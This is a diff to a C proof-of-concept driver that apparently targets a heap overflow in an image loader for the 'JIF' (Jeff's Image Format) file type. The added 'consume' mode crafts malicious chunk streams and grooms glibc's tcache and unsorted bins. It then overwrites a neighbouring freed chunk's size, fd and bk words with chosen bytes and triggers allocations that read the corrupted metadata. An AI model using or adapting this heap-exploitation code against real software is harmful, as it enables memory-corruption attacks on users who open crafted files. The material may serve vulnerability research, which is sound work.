@@ -57,6 +57,7 @@ ReadOK (FILE *fd, void *buf, size_t n)
 static unsigned char payload_byte = 0x4d;
 static unsigned char payload[512];
 static int payload_custom = 0;
+static void *consume_B = NULL;
 
 /* Build a JIF-style chunk stream whose zlib payload inflates to `outlen`
  * copies of the chosen payload byte (same construction as harness/driver.c). */
@@ -158,6 +159,9 @@ main (int argc, char **argv)
 {
   setvbuf (stdout, NULL, _IONBF, 0);
   const char *mode = (argc > 1) ? argv[1] : "attack";
+  int consume_mode = (! strcmp (mode, "consume") || ! strcmp (mode, "consumesz") ||
+                      ! strcmp (mode, "consume-safe"));
+  int consume_safe = ! strcmp (mode, "consume-safe");
   int caller_mode = (! strcmp (mode, "caller") || ! strcmp (mode, "callerpub"));
   int file_mode = (! strcmp (mode, "file") || ! strcmp (mode, "fileptr") ||
                    caller_mode);
@@ -223,7 +227,11 @@ main (int argc, char **argv)
       printf ("DEST_FIRST=%02x\n", caller_dest[0]);
     }
 
-  if (! strcmp (mode, "safe"))
+  if (consume_safe)
+    {
+      len = 4; height = 4; alpha = FALSE; outlen = 16;
+    }
+  else if (! strcmp (mode, "safe"))
     {
       len = 4; height = 4; alpha = FALSE; outlen = 16;
     }
@@ -245,6 +253,62 @@ main (int argc, char **argv)
       memcpy (payload + 272, &chosen, sizeof chosen);
       payload_custom = 1;
       printf ("CHOSEN_PTR=%p PAYLOAD_OFFSET=272\n", chosen);
+    }
+  if (consume_mode && ! consume_safe)
+    {
+      size_t sz = ! strcmp (mode, "consumesz")
+        ? (size_t) 0x210 : (size_t) 0x4d4d4d4d4d4d4d4dUL;
+      memset (payload, payload_byte, sizeof payload);
+      memcpy (payload + 264, &sz, sizeof sz);
+      payload_custom = 1;
+      printf ("CONSUME_SIZE_WORD=%016zx PAYLOAD_OFFSET=264\n", sz);
+    }
+
+  /* Downstream-consumer mode: B is the 260-byte chunk the pin reuses as
+   * `indexes`; the following chunk A is free in glibc's 272-byte smallbin.
+   * Chosen bytes from the JIF overwrite A's size/fd/bk words at B+264,
+   * and a post-pin 260-byte allocation makes glibc read that corrupted
+   * metadata. No pointer from the file is dereferenced by this driver. */
+  if (consume_mode)
+    {
+      build_stream (outlen);
+      void *fill[7];
+      void *guard0 = g_try_malloc (260);
+      consume_B = g_try_malloc (260);
+      void *victim_A = g_try_malloc (260);
+      void *guard1 = g_try_malloc (260);
+      printf ("LAYOUT consume guard0=%p B=%p A=%p guard1=%p "
+              "delta_BA=%td usable_B=%zu\n",
+              guard0, consume_B, victim_A, guard1,
+              (ptrdiff_t) ((char *) victim_A - (char *) consume_B),
+              malloc_usable_size (consume_B));
+      for (i = 0; i < 7; i++)
+        {
+          fill[i] = g_try_malloc (260);
+          memset (fill[i], 0x5a, 260);
+        }
+      for (i = 0; i < 7; i++)
+        g_free (fill[i]);             /* 260-byte tcache bin full */
+      void *drop = g_try_malloc (260); /* room for B; A still in use */
+      g_free (consume_B);             /* B is tcache head (count 6 -> 7) */
+      g_free (victim_A);              /* tcache full: A to unsorted */
+      printf ("LAYOUT consume prepared B=%p A=%p drop=%p\n",
+              consume_B, victim_A, drop);
+
+      rc = ReadJeffsImage (NULL, dest, 8, len, height, alpha,
+                           &image, &error);
+      printf ("MODE=%s PAYLOAD=%02x RC=%d ERR=%s\n",
+              mode, payload_byte, rc ? 1 : 0, g_error_msg);
+      printf ("POST_PIN A_size_word=%016zx A_fd=%016zx A_bk=%016zx\n",
+              *(size_t *) ((char *) consume_B + 264),
+              *(size_t *) ((char *) consume_B + 272),
+              *(size_t *) ((char *) consume_B + 280));
+      for (int k = 0; k < 10; k++)
+        {
+          void *after = g_try_malloc (260);
+          printf ("POST_PIN malloc260[%d]=%p\n", k, after);
+        }
+      return 0;
     }
 
   /* Groom the real glib/glibc heap: a freed 272-byte chunk immediately
